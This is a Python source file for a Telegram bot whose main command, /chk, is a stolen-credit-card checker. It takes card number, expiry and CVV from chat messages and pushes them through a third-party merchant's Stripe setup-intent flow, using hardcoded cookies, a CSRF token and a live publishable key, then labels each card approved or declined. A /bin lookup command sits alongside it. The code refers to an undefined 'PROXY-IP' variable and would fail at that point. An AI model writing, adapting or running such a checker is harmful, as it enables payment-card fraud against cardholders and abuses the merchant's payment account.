import logging
import os
import requests
import time
import string
import random
import yaml
import asyncio
import re

from aiogram import Bot, Dispatcher, executor, types
from aiogram.utils.exceptions import Throttled
from aiogram.contrib.fsm_storage.memory import MemoryStorage


# Configure vars get from env or config.yml
CONFIG = yaml.load(open('config.yml', 'r'), Loader=yaml.SafeLoader)
TOKEN = os.getenv('TOKEN', CONFIG['token'])
BLACKLISTED = os.getenv('BLACKLISTED', CONFIG['blacklisted']).split()
PREFIX = os.getenv('PREFIX', CONFIG['prefix'])
OWNER = int(os.getenv('OWNER', CONFIG['owner']))
ANTISPAM = int(os.getenv('ANTISPAM', CONFIG['antispam']))

# Initialize bot and dispatcher
storage = MemoryStorage()
bot = Bot(token=TOKEN, parse_mode=types.ParseMode.HTML)
dp = Dispatcher(bot, storage=storage)

# Configure logging
logging.basicConfig(level=logging.INFO)

# BOT INFO
loop = asyncio.get_event_loop()

bot_info = loop.run_until_complete(bot.get_me())
BOT_USERNAME = bot_info.username
BOT_NAME = bot_info.first_name
BOT_ID = bot_info.id


session = requests.Session()

# Random DATA
letters = string.ascii_lowercase
First = ''.join(random.choice(letters) for i in range(6))
Last = ''.join(random.choice(letters) for i in range(6))
PWD = ''.join(random.choice(letters) for i in range(10))
Name = f'{First}+{Last}'
Email = f'{First}.{Last}@gmail.com'
UA = 'Mozilla/5.0 (X11; Linux i686; rv:102.0) Gecko/20100101 Firefox/102.0'


async def is_owner(user_id):
    status = False
    if user_id == OWNER:
        status = True
    return status


@dp.message_handler(commands=['start', 'help'], commands_prefix=PREFIX)
async def helpstr(message: types.Message):
    # await message.answer_chat_action('typing')
    keyboard_markup = types.InlineKeyboardMarkup(row_width=3)
    btns = types.InlineKeyboardButton("developer", url="https://t.me/srfxdz")
    keyboard_markup.row(btns)
    FIRST = message.from_user.first_name
    MSG = f'''
Hello {FIRST}, Im {BOT_NAME}
U can find my owner  <a href="tg://user?id={OWNER}">HERE</a>
Cmds /chk /info /bin'''
    await message.answer(MSG, reply_markup=keyboard_markup,
                        disable_web_page_preview=True)


@dp.message_handler(commands=['info', 'id'], commands_prefix=PREFIX)
async def info(message: types.Message):
    if message.reply_to_message:
        user_id = message.reply_to_message.from_user.id
        is_bot = message.reply_to_message.from_user.is_bot
        username = message.reply_to_message.from_user.username
        first = message.reply_to_message.from_user.first_name
    else:
        user_id = message.from_user.id
        is_bot = message.from_user.is_bot
        username = message.from_user.username
        first = message.from_user.first_name
    await message.reply(f'''
═════════╕
<b>USER INFO</b>
<b>USER ID:</b> <code>{user_id}</code>
<b>USERNAME:</b> @{username}
<b>FIRSTNAME:</b> {first}
<b>BOT:</b> {is_bot}
<b>BOT-OWNER:</b> {await is_owner(user_id)}
╘═════════''')


@dp.message_handler(commands=['bin'], commands_prefix=PREFIX)
async def binio(message: types.Message):
    await message.answer_chat_action('typing')
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    BIN = message.text[len('/bin '):]
    if len(BIN) < 6:
        return await message.reply(
                   'Send bin not ass'
        )
    r = requests.get(
               f'https://lookup.binlist.net/{BIN}'
    ).json()
    INFO = f'''
BIN⇢ <code>{BIN}</code>
Brand⇢ <u>{r["brand"]}</u>
Type⇢ <u>{r["type"]}</u>
Level⇢ <u>{r["level"]}</u>
Bank⇢ <u>{r["bank"]}</u>
Currency⇢ <u>{r["currency"]}</u>
Country⇢ <u>{r["country"]}</u>
SENDER: <a href="tg://user?id={ID}">{FIRST}</a>
BOT⇢ @{BOT_USERNAME}
OWNER⇢ <a href="tg://user?id={OWNER}">LINK</a>
'''
    await message.reply(INFO)


@dp.message_handler(commands=['chk'], commands_prefix=PREFIX)
async def ch(message: types.Message):
    await message.answer_chat_action('typing')
    tic = time.perf_counter()
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    try:
        await dp.throttle('chk', rate=ANTISPAM)
    except Throttled:
        await message.reply('<b>Too many requests!</b>\n'
                            f'Blocked For {ANTISPAM} seconds')
    else:
        if message.reply_to_message:
            cc = message.reply_to_message.text
        else:
            cc = message.text[len('/chk '):]

        if len(cc) == 0:
            return await message.reply("<b>No Card to chk</b>")

        x = re.findall(r'\d+', cc)
        ccn = x[0]
        mm = x[1]
        yy = x[2]
        cvv = x[3]
        if mm.startswith('2'):
            mm, yy = yy, mm
        if len(mm) >= 3:
            mm, yy, cvv = yy, cvv, mm
        if len(ccn) < 15 or len(ccn) > 16:
            return await message.reply('<b>Failed to parse Card</b>\n'
                                       '<b>Reason: Invalid Format!</b>')   
        BIN = ccn[:6]
        if BIN in BLACKLISTED:
            return await message.reply('<b>BLACKLISTED BIN</b>')
        URL = "https://api.stripe.com/v1/payment_methods"
        headers = {
            "authority": "api.stripe.com",
            "method" : "POST",
            "path": "/v1/payment_methods",
            "scheme": "https",
            "accept": 'application/json',
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9",
            "content-length": "379",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
        }

        headers2 = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Length": "402",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": "PnuzGQLJEB_=XNzOUS; NwJZoDApIgQC-XjE=835B2n%5Bpl%2Ao; OdBAFXyxSn=NVc%40vTZ%5B1EsnOaB; PBUlim=Lwl_uM; _ga=GA1.2.255801535.1664199308; _gid=GA1.2.1183799934.1664199308; __stripe_mid=ad3fa220-2caa-4f33-8892-e14c35affff8e5402d; __stripe_sid=7d8e5083-3ba0-4dd5-a2ab-41f799d51fa03d7987; ihcMedia=o6agrTyzPqdwR7v8OC",
            "Host": "app.campaigntrackly.com",
            "Origin": "https://app.campaigntrackly.com",
            "Referer": "https://app.campaigntrackly.com/register/?lid=18",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.50",
            "X-CSRF-UMP-TOKEN": "2832a13e48",
            "X-Requested-With": "XMLHttpRequest",

        }

        guid = "76613c9e-9b97-4820-b730-4ec72f50d601e30615"
        muid = "ad3fa220-2caa-4f33-8892-e14c35affff8e5402d"
        sid = "5c1f1c3b-b931-4bd6-8bcb-44004adf871a77baf8"
        name = "sherlock"

        data = f"type=card&billing_details[name]={name}&card[number]={ccn}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&guid=7{guid}&muid={muid}&sid={sid}&pasted_fields=number&payment_user_agent=stripe.js%2Fee7fb6c3a%3B+stripe-js-v3%2Fee7fb6c3a&time_on_page=425944&key=pk_live_51BNl0DHtAjaXzLU8fCWhEvWLvf0xRBQO7tBKVKxLAkRKM5Z0QTMb3EDzPeAOF643MGO0clbRJwER1jwMdUvCRlTn00KF92ZsmB&_stripe_account=acct_1BNl0DHtAjaXzLU8"
        #------------------------------first req-------------------------------------
        try:
            RE = session.post(URL, data=data, headers=headers,).json()
            ek = RE["id"]
        except:
            pass
        #----------------------------second req2------------------------------------
        url2 = "https://app.campaigntrackly.com/wp-admin/admin-ajax.php"
        data2 = f"action=ihc_ajax_stripe_connect_generate_setup_intent&session=YTo2OntzOjEyOiJmaXJzdF9hbW91bnQiO2k6MDtzOjY6ImFtb3VudCI7ZDo0Ljk5O3M6ODoiY3VycmVuY3kiO3M6MzoiVVNEIjtzOjM6InVpZCI7aTowO3M6MzoibGlkIjtzOjI6IjE4IjtzOjExOiJsZXZlbF9sYWJlbCI7czoyODoiU21hbGwgQnVzaW5lc3MgU3BlY2lhbCBmb3IgMSI7fQ%3D%3D&payment_method={ek}&sdxeHTaIlCwS=3w2@ybM&CNgpvsXquaLK=C*]_vGV&AikwgMnfcjRPKDOm=5]j6HN@ClL_Wor"
        me = session.post(url2, data=data2, headers=headers2).json() 
        si = me["client_secret"]
        se = me["setup_intent_id"]
        #---------------------------third req3---------------------------------------
        url3 = f"https://api.stripe.com/v1/setup_intents/{se}/confirm"
        data3 = f"payment_method_data[type]=card&payment_method_data[billing_details][name]=&payment_method_data[card][number]={ccn}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mm}&payment_method_data[card][exp_year]={yy}&payment_method_data[guid]={guid}&payment_method_data[muid]={muid}&payment_method_data[sid]={sid}&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Fee7fb6c3a%3B+stripe-js-v3%2Fee7fb6c3a&payment_method_data[time_on_page]=868717&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51BNl0DHtAjaXzLU8fCWhEvWLvf0xRBQO7tBKVKxLAkRKM5Z0QTMb3EDzPeAOF643MGO0clbRJwER1jwMdUvCRlTn00KF92ZsmB&_stripe_account=acct_1BNl0DHtAjaXzLU8&client_secret={si}"
        resp = session.post(url3, data=data3, headers=headers).json()
        toc = time.perf_counter()
        try:
            ddm = resp["status"]
            if ddm =="succeeded":
                return await message.reply(f'''
✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ #ApprovedCVV
<b>MSG</b>➟ {ddm}
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>OWNER</b>: {await is_owner(ID)}
<b>BOT</b>: @{BOT_USERNAME}''')
            
        except:
            ccm = resp["error"]["code"]
            if ccm =="incorrect_cvc":
                return await message.reply(f'''
🟡<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ #ApprovedCCN
<b>MSG</b>➟ {ccm}
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>OWNER</b>: {await is_owner(ID)}
<b>BOT</b>: @{BOT_USERNAME}''')
            else:
                return await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Declined
<b>MSG</b>➟ {ccm}
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>OWNER</b>: {await is_owner(ID)}
<b>BOT</b>: @{BOT_USERNAME}''')

    



if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True, loop=loop)
